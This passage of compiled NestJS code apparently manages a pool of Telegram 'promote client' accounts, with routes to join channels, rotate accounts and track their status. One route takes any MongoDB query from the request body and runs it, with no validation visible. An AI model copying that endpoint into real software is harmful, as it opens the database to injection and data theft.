  !*** ./src/components/promote-clients/dto/search-promote-client.dto.ts ***!
  \*************************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.SearchPromoteClientDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
class SearchPromoteClientDto {
}
exports.SearchPromoteClientDto = SearchPromoteClientDto;
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Telegram ID of the client',
        example: '123456789',
    }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchPromoteClientDto.prototype, "tgId", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Mobile number of the client',
        example: '+1234567890',
    }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchPromoteClientDto.prototype, "mobile", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'availableDate of the promoteClient',
        example: '2023-06-22',
    }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchPromoteClientDto.prototype, "availableDate", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Channel Count',
        example: 23,
        type: Number
    }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], SearchPromoteClientDto.prototype, "channels", void 0);


/***/ }),

/***/ "./src/components/promote-clients/dto/update-promote-client.dto.ts":
/*!*************************************************************************!*\
  !*** ./src/components/promote-clients/dto/update-promote-client.dto.ts ***!
  \*************************************************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {


Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UpdatePromoteClientDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const create_promote_client_dto_1 = __webpack_require__(/*! ./create-promote-client.dto */ "./src/components/promote-clients/dto/create-promote-client.dto.ts");
class UpdatePromoteClientDto extends (0, swagger_1.PartialType)(create_promote_client_dto_1.CreatePromoteClientDto) {
}
exports.UpdatePromoteClientDto = UpdatePromoteClientDto;


/***/ }),

/***/ "./src/components/promote-clients/index.ts":
/*!*************************************************!*\
  !*** ./src/components/promote-clients/index.ts ***!
  \*************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __exportStar = (this && this.__exportStar) || function(m, exports) {
    for (var p in m) if (p !== "default" && !Object.prototype.hasOwnProperty.call(exports, p)) __createBinding(exports, m, p);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
__exportStar(__webpack_require__(/*! ./promote-client.controller */ "./src/components/promote-clients/promote-client.controller.ts"), exports);
__exportStar(__webpack_require__(/*! ./promote-client.module */ "./src/components/promote-clients/promote-client.module.ts"), exports);
__exportStar(__webpack_require__(/*! ./promote-client.service */ "./src/components/promote-clients/promote-client.service.ts"), exports);
__exportStar(__webpack_require__(/*! ./dto */ "./src/components/promote-clients/dto/index.ts"), exports);
__exportStar(__webpack_require__(/*! ./schemas */ "./src/components/promote-clients/schemas/index.ts"), exports);


/***/ }),

/***/ "./src/components/promote-clients/promote-client.controller.ts":
/*!*********************************************************************!*\
  !*** ./src/components/promote-clients/promote-client.controller.ts ***!
  \*********************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.PromoteClientController = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const promote_client_service_1 = __webpack_require__(/*! ./promote-client.service */ "./src/components/promote-clients/promote-client.service.ts");
const create_promote_client_dto_1 = __webpack_require__(/*! ./dto/create-promote-client.dto */ "./src/components/promote-clients/dto/create-promote-client.dto.ts");
const search_promote_client_dto_1 = __webpack_require__(/*! ./dto/search-promote-client.dto */ "./src/components/promote-clients/dto/search-promote-client.dto.ts");
const update_promote_client_dto_1 = __webpack_require__(/*! ./dto/update-promote-client.dto */ "./src/components/promote-clients/dto/update-promote-client.dto.ts");
let PromoteClientController = class PromoteClientController {
    constructor(clientService) {
        this.clientService = clientService;
    }
    async create(createClientDto) {
        return this.clientService.create(createClientDto);
    }
    async search(query) {
        return this.clientService.search(query);
    }
    async joinChannelsforPromoteClients() {
        return this.clientService.joinchannelForPromoteClients();
    }
    async updateInfo() {
        this.clientService.updateInfo().catch(error => {
            console.error('Error in checkPromoteClients:', error);
        });
        return "initiated Checking";
    }
    async checkpromoteClients() {
        this.clientService.checkPromoteClients().catch(error => {
            console.error('Error in checkPromoteClients:', error);
        });
        return "initiated Checking";
    }
    async addNewUserstoPromoteClients(body) {
        if (!body || !Array.isArray(body.goodIds) || !Array.isArray(body.badIds)) {
            throw new common_1.BadRequestException('goodIds and badIds must be arrays');
        }
        if (body.clientsNeedingPromoteClients && !Array.isArray(body.clientsNeedingPromoteClients)) {
            throw new common_1.BadRequestException('clientsNeedingPromoteClients must be an array');
        }
        this.clientService.addNewUserstoPromoteClients(body.badIds, body.goodIds, body.clientsNeedingPromoteClients || [], undefined).catch(error => {
            console.error('Error in addNewUserstoPromoteClients:', error);
        });
        return "initiated Checking";
    }
    async findAll(status) {
        return this.clientService.findAll(status);
    }
    async setAsPromoteClient(mobile) {
        return await this.clientService.setAsPromoteClient(mobile);
    }
    async findOne(mobile) {
        return this.clientService.findOne(mobile);
    }
    async update(mobile, updateClientDto) {
        return this.clientService.update(mobile, updateClientDto);
    }
    async createdOrupdate(mobile, updateClientDto) {
        return this.clientService.createOrUpdate(mobile, updateClientDto);
    }
    async remove(mobile) {
        return this.clientService.remove(mobile);
    }
    async executeQuery(query) {
        try {
            return await this.clientService.executeQuery(query);
        }
        catch (error) {
            throw error;
        }
    }
    async getPromoteClientDistribution() {
        return this.clientService.getPromoteClientDistribution();
    }
    async getPromoteClientsByStatus(status) {
        return this.clientService.getPromoteClientsByStatus(status);
    }
    async getPromoteClientsWithMessages() {
        return this.clientService.getPromoteClientsWithMessages();
    }
    async updateStatus(mobile, body) {
        return this.clientService.updateStatus(mobile, body.status, body.message);
    }
    async markAsActive(mobile, body = {}) {
        return this.clientService.markAsActive(mobile, body.message);
    }
    async markAsInactive(mobile, body) {
        return this.clientService.markAsInactive(mobile, body.reason);
    }
    async markAsUsed(mobile, body = {}) {
        return this.clientService.markAsUsed(mobile, body.message);
    }
    async updateLastUsed(mobile) {
        return this.clientService.updateLastUsed(mobile);
    }
    async getLeastRecentlyUsed(clientId, limit) {
        return this.clientService.getLeastRecentlyUsedPromoteClients(clientId, limit || 1);
    }
    async getNextAvailable(clientId) {
        return this.clientService.getNextAvailablePromoteClient(clientId);
    }
    async getUnusedPromoteClients(hoursAgo, clientId) {
        return this.clientService.getUnusedPromoteClients(hoursAgo || 24, clientId);
    }
    async getUsageStatistics(clientId) {
        return this.clientService.getUsageStatistics(clientId);
    }
};
exports.PromoteClientController = PromoteClientController;
__decorate([
    (0, common_1.Post)(),
    (0, swagger_1.ApiOperation)({ summary: 'Create user data' }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [create_promote_client_dto_1.CreatePromoteClientDto]),
    __metadata("design:returntype", Promise)
], PromoteClientController.prototype, "create", null);
__decorate([
    (0, common_1.Get)('search'),
    (0, swagger_1.ApiOperation)({ summary: 'Search user data' }),
    (0, swagger_1.ApiQuery)({ name: 'mobile', required: false, description: 'Mobile number' }),
    (0, swagger_1.ApiQuery)({ name: 'firstName', required: false, description: 'First name' }),
    (0, swagger_1.ApiQuery)({ name: 'lastName', required: false, description: 'Last name' }),
    (0, swagger_1.ApiQuery)({ name: 'username', required: false, description: 'Username' }),
    __param(0, (0, common_1.Query)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [search_promote_client_dto_1.SearchPromoteClientDto]),
    __metadata("design:returntype", Promise)
], PromoteClientController.prototype, "search", null);
__decorate([
    (0, common_1.Get)('joinChannelsForPromoteClients'),
    (0, swagger_1.ApiOperation)({ summary: 'Join Channels for PromoteClients' }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], PromoteClientController.prototype, "joinChannelsforPromoteClients", null);
__decorate([
    (0, common_1.Get)('updateInfo'),
    (0, swagger_1.ApiOperation)({ summary: 'Update promote Clients Info' }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], PromoteClientController.prototype, "updateInfo", null);
__decorate([
    (0, common_1.Get)('checkPromoteClients'),
    (0, swagger_1.ApiOperation)({ summary: 'Check Promote Clients' }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], PromoteClientController.prototype, "checkpromoteClients", null);
__decorate([
    (0, common_1.Post)('addNewUserstoPromoteClients'),
    (0, swagger_1.ApiOperation)({ summary: 'Add New Users to Promote Clients' }),
    (0, swagger_1.ApiBody)({
        schema: {
            type: 'object',
            properties: {
                goodIds: { type: 'array', items: { type: 'string' } },
                badIds: { type: 'array', items: { type: 'string' } },
                clientsNeedingPromoteClients: { type: 'array', items: { type: 'string' } }
            }
        }
    }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [Object]),
    __metadata("design:returntype", Promise)
], PromoteClientController.prototype, "addNewUserstoPromoteClients", null);
__decorate([
    (0, common_1.Get)(),
    (0, swagger_1.ApiOperation)({ summary: 'Get all user data' }),
    (0, swagger_1.ApiQuery)({ name: 'status', required: false, description: 'Filter by status (active/inactive)' }),
    __param(0, (0, common_1.Query)('status')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], PromoteClientController.prototype, "findAll", null);
__decorate([
    (0, common_1.Get)('SetAsPromoteClient/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Set as Promote Client' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'User mobile number', type: String }),
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], PromoteClientController.prototype, "setAsPromoteClient", null);
__decorate([
    (0, common_1.Get)('mobile/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Get user data by ID' }),
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], PromoteClientController.prototype, "findOne", null);
__decorate([
    (0, common_1.Patch)('mobile/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Update user data by ID' }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, update_promote_client_dto_1.UpdatePromoteClientDto]),
    __metadata("design:returntype", Promise)
], PromoteClientController.prototype, "update", null);
__decorate([
    (0, common_1.Put)('mobile/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Update user data by ID' }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, update_promote_client_dto_1.UpdatePromoteClientDto]),
    __metadata("design:returntype", Promise)
], PromoteClientController.prototype, "createdOrupdate", null);
__decorate([
    (0, common_1.Delete)('mobile/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Delete user data by ID' }),
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], PromoteClientController.prototype, "remove", null);
__decorate([
    (0, common_1.Post)('query'),
    (0, swagger_1.ApiOperation)({ summary: 'Execute a custom MongoDB query' }),
    (0, swagger_1.ApiBody)({ type: Object }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [Object]),
    __metadata("design:returntype", Promise)
], PromoteClientController.prototype, "executeQuery", null);
__decorate([
    (0, common_1.Get)('distribution'),
    (0, swagger_1.ApiOperation)({ summary: 'Get promote client distribution per client' }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], PromoteClientController.prototype, "getPromoteClientDistribution", null);
__decorate([
    (0, common_1.Get)('status/:status'),
    (0, swagger_1.ApiOperation)({ summary: 'Get promote clients by status' }),
    (0, swagger_1.ApiParam)({ name: 'status', description: 'Status to filter by (active/inactive)', type: String }),
    __param(0, (0, common_1.Param)('status')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], PromoteClientController.prototype, "getPromoteClientsByStatus", null);
__decorate([
    (0, common_1.Get)('messages/all'),
    (0, swagger_1.ApiOperation)({ summary: 'Get all promote clients with their status messages' }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], PromoteClientController.prototype, "getPromoteClientsWithMessages", null);
__decorate([
    (0, common_1.Patch)('status/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Update status of a promote client' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number of the promote client', type: String }),
    (0, swagger_1.ApiBody)({
        schema: {
            type: 'object',
            properties: {
                status: { type: 'string', description: 'New status (active/inactive)' },
                message: { type: 'string', description: 'Status message (optional)' }
            },
            required: ['status']
        }
    }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, Object]),
    __metadata("design:returntype", Promise)
], PromoteClientController.prototype, "updateStatus", null);
__decorate([
    (0, common_1.Patch)('activate/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Mark a promote client as active' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number of the promote client', type: String }),
    (0, swagger_1.ApiBody)({
        schema: {
            type: 'object',
            properties: {
                message: { type: 'string', description: 'Activation message (optional)' }
            }
        }
    }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, Object]),
    __metadata("design:returntype", Promise)
], PromoteClientController.prototype, "markAsActive", null);
__decorate([
    (0, common_1.Patch)('deactivate/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Mark a promote client as inactive' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number of the promote client', type: String }),
    (0, swagger_1.ApiBody)({
        schema: {
            type: 'object',
            properties: {
                reason: { type: 'string', description: 'Reason for deactivation' }
            },
            required: ['reason']
        }
    }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, Object]),
    __metadata("design:returntype", Promise)
], PromoteClientController.prototype, "markAsInactive", null);
__decorate([
    (0, common_1.Patch)('mark-used/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Mark a promote client as used (update lastUsed timestamp)' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number of the promote client', type: String }),
    (0, swagger_1.ApiBody)({
        schema: {
            type: 'object',
            properties: {
                message: { type: 'string', description: 'Usage message (optional)' }
            }
        }
    }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, Object]),
    __metadata("design:returntype", Promise)
], PromoteClientController.prototype, "markAsUsed", null);
__decorate([
    (0, common_1.Patch)('update-last-used/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Update last used timestamp for a promote client' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number of the promote client', type: String }),
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], PromoteClientController.prototype, "updateLastUsed", null);
__decorate([
    (0, common_1.Get)('least-recently-used/:clientId'),
    (0, swagger_1.ApiOperation)({ summary: 'Get least recently used promote clients for a specific client' }),
    (0, swagger_1.ApiParam)({ name: 'clientId', description: 'Client ID to get promote clients for', type: String }),
    (0, swagger_1.ApiQuery)({ name: 'limit', required: false, description: 'Number of promote clients to return', type: Number }),
    __param(0, (0, common_1.Param)('clientId')),
    __param(1, (0, common_1.Query)('limit')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, Number]),
    __metadata("design:returntype", Promise)
], PromoteClientController.prototype, "getLeastRecentlyUsed", null);
__decorate([
    (0, common_1.Get)('next-available/:clientId'),
    (0, swagger_1.ApiOperation)({ summary: 'Get next available promote client for a specific client' }),
    (0, swagger_1.ApiParam)({ name: 'clientId', description: 'Client ID to get next available promote client for', type: String }),
    __param(0, (0, common_1.Param)('clientId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], PromoteClientController.prototype, "getNextAvailable", null);
__decorate([
    (0, common_1.Get)('unused'),
    (0, swagger_1.ApiOperation)({ summary: 'Get promote clients that haven\'t been used for a specified time period' }),
    (0, swagger_1.ApiQuery)({ name: 'hoursAgo', required: false, description: 'Hours ago cutoff (default: 24)', type: Number }),
    (0, swagger_1.ApiQuery)({ name: 'clientId', required: false, description: 'Filter by specific client ID', type: String }),
    __param(0, (0, common_1.Query)('hoursAgo')),
    __param(1, (0, common_1.Query)('clientId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [Number, String]),
    __metadata("design:returntype", Promise)
], PromoteClientController.prototype, "getUnusedPromoteClients", null);
__decorate([
    (0, common_1.Get)('usage-stats'),
    (0, swagger_1.ApiOperation)({ summary: 'Get usage statistics for promote clients' }),
    (0, swagger_1.ApiQuery)({ name: 'clientId', required: false, description: 'Filter by specific client ID', type: String }),
    __param(0, (0, common_1.Query)('clientId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], PromoteClientController.prototype, "getUsageStatistics", null);
exports.PromoteClientController = PromoteClientController = __decorate([
    (0, swagger_1.ApiTags)('Promote Clients'),
    (0, common_1.Controller)('promoteclients'),
    __metadata("design:paramtypes", [promote_client_service_1.PromoteClientService])
], PromoteClientController);


/***/ }),

/***/ "./src/components/promote-clients/promote-client.module.ts":
/*!*****************************************************************!*\
  !*** ./src/components/promote-clients/promote-client.module.ts ***!
  \*****************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.PromoteClientModule = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const promote_client_service_1 = __webpack_require__(/*! ./promote-client.service */ "./src/components/promote-clients/promote-client.service.ts");
const promote_client_controller_1 = __webpack_require__(/*! ./promote-client.controller */ "./src/components/promote-clients/promote-client.controller.ts");
const promote_client_schema_1 = __webpack_require__(/*! ./schemas/promote-client.schema */ "./src/components/promote-clients/schemas/promote-client.schema.ts");
const Telegram_module_1 = __webpack_require__(/*! ../Telegram/Telegram.module */ "./src/components/Telegram/Telegram.module.ts");
const active_channels_module_1 = __webpack_require__(/*! ../active-channels/active-channels.module */ "./src/components/active-channels/active-channels.module.ts");
const users_module_1 = __webpack_require__(/*! ../users/users.module */ "./src/components/users/users.module.ts");
const client_module_1 = __webpack_require__(/*! ../clients/client.module */ "./src/components/clients/client.module.ts");
const init_module_1 = __webpack_require__(/*! ../ConfigurationInit/init.module */ "./src/components/ConfigurationInit/init.module.ts");
const channels_module_1 = __webpack_require__(/*! ../channels/channels.module */ "./src/components/channels/channels.module.ts");
const buffer_client_module_1 = __webpack_require__(/*! ../buffer-clients/buffer-client.module */ "./src/components/buffer-clients/buffer-client.module.ts");
const session_manager_1 = __webpack_require__(/*! ../session-manager */ "./src/components/session-manager/index.ts");
let PromoteClientModule = class PromoteClientModule {
};
exports.PromoteClientModule = PromoteClientModule;
exports.PromoteClientModule = PromoteClientModule = __decorate([
    (0, common_1.Module)({
        imports: [
            init_module_1.InitModule,
            mongoose_1.MongooseModule.forFeature([{ name: promote_client_schema_1.PromoteClient.name, schema: promote_client_schema_1.PromoteClientSchema, collection: 'promoteClients' }]),
            (0, common_1.forwardRef)(() => Telegram_module_1.TelegramModule),
            (0, common_1.forwardRef)(() => users_module_1.UsersModule),
            (0, common_1.forwardRef)(() => active_channels_module_1.ActiveChannelsModule),
            (0, common_1.forwardRef)(() => client_module_1.ClientModule),
            (0, common_1.forwardRef)(() => channels_module_1.ChannelsModule),
            (0, common_1.forwardRef)(() => buffer_client_module_1.BufferClientModule),
            (0, common_1.forwardRef)(() => session_manager_1.SessionModule)
        ],
        controllers: [promote_client_controller_1.PromoteClientController],
        providers: [promote_client_service_1.PromoteClientService],
        exports: [promote_client_service_1.PromoteClientService]
    })
], PromoteClientModule);


/***/ }),

/***/ "./src/components/promote-clients/promote-client.service.ts":
/*!******************************************************************!*\
  !*** ./src/components/promote-clients/promote-client.service.ts ***!
  \******************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
var PromoteClientService_1;
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.PromoteClientService = void 0;
const channels_service_1 = __webpack_require__(/*! ../channels/channels.service */ "./src/components/channels/channels.service.ts");
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __webpack_require__(/*! mongoose */ "mongoose");
const promote_client_schema_1 = __webpack_require__(/*! ./schemas/promote-client.schema */ "./src/components/promote-clients/schemas/promote-client.schema.ts");
const Telegram_service_1 = __webpack_require__(/*! ../Telegram/Telegram.service */ "./src/components/Telegram/Telegram.service.ts");
const Helpers_1 = __webpack_require__(/*! telegram/Helpers */ "telegram/Helpers");
const users_service_1 = __webpack_require__(/*! ../users/users.service */ "./src/components/users/users.service.ts");
const active_channels_service_1 = __webpack_require__(/*! ../active-channels/active-channels.service */ "./src/components/active-channels/active-channels.service.ts");
const client_service_1 = __webpack_require__(/*! ../clients/client.service */ "./src/components/clients/client.service.ts");
const buffer_client_service_1 = __webpack_require__(/*! ../buffer-clients/buffer-client.service */ "./src/components/buffer-clients/buffer-client.service.ts");
const parseError_1 = __webpack_require__(/*! ../../utils/parseError */ "./src/utils/parseError.ts");
const fetchWithTimeout_1 = __webpack_require__(/*! ../../utils/fetchWithTimeout */ "./src/utils/fetchWithTimeout.ts");
const logbots_1 = __webpack_require__(/*! ../../utils/logbots */ "./src/utils/logbots.ts");
const connection_manager_1 = __webpack_require__(/*! ../Telegram/utils/connection-manager */ "./src/components/Telegram/utils/connection-manager.ts");
const session_manager_1 = __webpack_require__(/*! ../session-manager */ "./src/components/session-manager/index.ts");
const utils_1 = __webpack_require__(/*! ../../utils */ "./src/utils/index.ts");
let PromoteClientService = PromoteClientService_1 = class PromoteClientService {
    constructor(promoteClientModel, telegramService, usersService, activeChannelsService, clientService, channelsService, bufferClientService, sessionService) {
        this.promoteClientModel = promoteClientModel;
        this.telegramService = telegramService;
        this.usersService = usersService;
        this.activeChannelsService = activeChannelsService;
        this.clientService = clientService;
        this.channelsService = channelsService;
        this.bufferClientService = bufferClientService;
        this.sessionService = sessionService;
        this.logger = new common_1.Logger(PromoteClientService_1.name);
        this.joinChannelMap = new Map();
        this.joinChannelIntervalId = null;
        this.leaveChannelMap = new Map();
        this.leaveChannelIntervalId = null;
        this.isLeaveChannelProcessing = false;
        this.isJoinChannelProcessing = false;
        this.activeTimeouts = new Set();
        this.JOIN_CHANNEL_INTERVAL = 4 * 60 * 1000;
        this.LEAVE_CHANNEL_INTERVAL = 60 * 1000;
        this.LEAVE_CHANNEL_BATCH_SIZE = 10;
        this.MAX_NEW_PROMOTE_CLIENTS_PER_TRIGGER = 10;
        this.MAX_NEEDED_PROMOTE_CLIENTS_PER_CLIENT = 12;
        this.MAX_MAP_SIZE = 100;
        this.CHANNEL_PROCESSING_DELAY = 10000;
        this.CLEANUP_INTERVAL = 10 * 60 * 1000;
        this.cleanupIntervalId = null;
    }
    checkMemoryHealth() {
        const memoryStats = {
            joinMapSize: this.joinChannelMap.size,
            leaveMapSize: this.leaveChannelMap.size,
            activeTimeouts: this.activeTimeouts.size,
            isJoinProcessing: this.isJoinChannelProcessing,
            isLeaveProcessing: this.isLeaveChannelProcessing,
        };
        this.logger.debug('Memory health check:', memoryStats);
        if (memoryStats.joinMapSize > this.MAX_MAP_SIZE * 0.9) {
            this.logger.warn('Join map approaching memory limit, performing emergency cleanup');
            this.performMemoryCleanup();
        }
        if (memoryStats.leaveMapSize > this.MAX_MAP_SIZE * 0.9) {
            this.logger.warn('Leave map approaching memory limit, performing emergency cleanup');
            this.performMemoryCleanup();
        }
    }
    startMemoryCleanup() {
        this.cleanupIntervalId = setInterval(() => {
            this.performMemoryCleanup();
        }, this.CLEANUP_INTERVAL);
        this.activeTimeouts.add(this.cleanupIntervalId);
    }
    clearMemoryCleanup() {
        if (this.cleanupIntervalId) {
            clearInterval(this.cleanupIntervalId);
            this.activeTimeouts.delete(this.cleanupIntervalId);
            this.cleanupIntervalId = null;
        }
    }
    performMemoryCleanup() {
        try {
            for (const [mobile, channels] of this.joinChannelMap.entries()) {
                if (!channels || channels.length === 0) {
                    console.log(`Cleaning up joinChannelMap entry for mobile: ${mobile} as channels : ${channels}`);
                    this.joinChannelMap.delete(mobile);
                }
            }
            for (const [mobile, channels] of this.leaveChannelMap.entries()) {
                if (!channels || channels.length === 0) {
                    console.log(`Cleaning up leaveChannelMap entry for mobile: ${mobile} as channels : ${channels}`);
                    this.leaveChannelMap.delete(mobile);
                }
            }
            if (this.joinChannelMap.size > this.MAX_MAP_SIZE) {
                const keysToRemove = Array.from(this.joinChannelMap.keys()).slice(this.MAX_MAP_SIZE);
                keysToRemove.forEach((key) => this.joinChannelMap.delete(key));
                this.logger.warn(`Cleaned up ${keysToRemove.length} entries from joinChannelMap to prevent memory leak`);
            }
            if (this.leaveChannelMap.size > this.MAX_MAP_SIZE) {
                const keysToRemove = Array.from(this.leaveChannelMap.keys()).slice(this.MAX_MAP_SIZE);
                keysToRemove.forEach((key) => this.leaveChannelMap.delete(key));
                this.logger.warn(`Cleaned up ${keysToRemove.length} entries from leaveChannelMap to prevent memory leak`);
            }
